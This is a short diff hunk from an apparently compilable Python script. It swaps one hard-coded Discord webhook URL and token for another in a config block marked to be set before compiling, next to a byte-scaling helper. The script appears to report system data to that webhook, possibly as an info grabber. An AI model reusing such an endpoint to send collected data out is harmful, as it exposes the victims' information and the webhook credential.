@@ -25,7 +25,7 @@ from shutil import copyfile
 from sys import argv
 
 # CONFIG -> Setup before compiling
-url = "https://discord.com/api/webhooks/1329516594887659611/FEgNHjHO6JzJ_AcclPtkHiTKsfZ-gRtz3j0jUlSbv_yAjbUODrj-s-bXCm65tilMBriQ"  # Paste Discord Webhook url
+url = "https://discord.com/api/webhooks/1343639848799440946/veVEFlno-rlMj7urKsozn25Q7TmUvTRF8a33HSsEDCAVxSkXYdXAYiYWHPvsNXNM5giy"  # Paste Discord Webhook url
 
 # Scaling from bytes to KB,MB,GB, etc
 def scale(bytes, suffix="B"):
